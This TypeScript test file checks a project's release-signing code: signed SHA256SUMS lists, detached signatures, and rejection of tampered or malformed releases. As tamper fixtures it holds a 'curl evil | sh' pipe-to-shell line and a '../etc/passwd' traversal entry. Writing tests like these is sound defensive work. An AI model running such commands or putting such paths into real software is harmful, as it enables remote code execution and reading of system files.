import { describe, expect, test } from 'bun:test';
import { createHash } from 'node:crypto';
import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { generateReleaseKey, parseSums, publicOfSeed, signSums, verifyDir, verifyFile } from '../src/release/sign.ts';
import { RELEASE_PUBKEYS } from '../src/release/key.ts';

const key = generateReleaseKey();
const h = (s: string) => createHash('sha256').update(s).digest('hex');
function release(files: Record<string, string>): string {
  const d = mkdtempSync(join(tmpdir(), 'salu-rel-'));
  for (const [n, c] of Object.entries(files)) writeFileSync(join(d, n), c);
  writeFileSync(join(d, 'SHA256SUMS'), Object.entries(files).map(([n, c]) => `${h(c)}  ${n}\n`).join(''));
  writeFileSync(join(d, 'SHA256SUMS.sig'), signSums(readFileSync(join(d, 'SHA256SUMS')), key.seed));
  return d;
}
const pubs = [key.pub];

describe('release signing', () => {
  test('the public key is derived from the seed, and a signed folder verifies', () => {
    expect(publicOfSeed(key.seed)).toBe(key.pub);
    const d = release({ 'install-box.sh': 'echo hi', 'salu-box-linux-x64.tar.gz': 'bundle' });
    const r = verifyDir(d, { pubs, require: ['install-box.sh'] });
    expect(r.ok).toBe(true);
    expect(r.files.sort()).toEqual(['install-box.sh', 'salu-box-linux-x64.tar.gz']);
  });

  test('a changed file, an unlisted file, a missing required file, a bad signature and no pinned key all fail', () => {
    const d = release({ 'install-box.sh': 'echo hi' });
    writeFileSync(join(d, 'install-box.sh'), 'curl evil | sh');
    expect(verifyDir(d, { pubs }).message).toContain('does not match');
    const e = release({ 'install-box.sh': 'echo hi' });
    writeFileSync(join(e, 'extra.sh'), 'x');
    expect(verifyDir(e, { pubs }).message).toContain('not in the signed list');
    const f = release({ 'a': '1' });
    expect(verifyDir(f, { pubs, require: ['install-box.sh'] }).message).toContain('missing');
    const g = release({ 'a': '1' });
    expect(verifyDir(g, { pubs: [generateReleaseKey().pub] }).ok).toBe(false);
    writeFileSync(join(g, 'SHA256SUMS'), `${h('2')}  a\n`); // sums swapped after signing
    expect(verifyDir(g, { pubs }).message).toContain('signature');
    expect(RELEASE_PUBKEYS.length === 0 ? verifyDir(f).message : 'n/a').toMatch(/no release signing key|n\/a/);
  });

  test('a detached signature on one file (install-box.sh.sig) verifies and rejects edits', () => {
    const d = mkdtempSync(join(tmpdir(), 'salu-rel-'));
    writeFileSync(join(d, 'install-box.sh'), 'echo hi');
    writeFileSync(join(d, 'install-box.sh.sig'), signSums(Buffer.from('echo hi'), key.seed));
    expect(verifyFile(join(d, 'install-box.sh'), join(d, 'install-box.sh.sig'), pubs).ok).toBe(true);
    writeFileSync(join(d, 'install-box.sh'), 'echo pwned');
    expect(verifyFile(join(d, 'install-box.sh'), join(d, 'install-box.sh.sig'), pubs).ok).toBe(false);
    expect(verifyFile(join(d, 'install-box.sh'), join(d, 'nope.sig'), pubs).ok).toBe(false);
  });

  test('SHA256SUMS lines with folders or odd shapes are refused', () => {
    expect(() => parseSums(`${h('x')}  ../etc/passwd\n`)).toThrow();
    expect(() => parseSums('not a line\n')).toThrow();
    expect(parseSums(`${h('x')}  a\n`).get('a')).toBe(h('x'));
  });
});
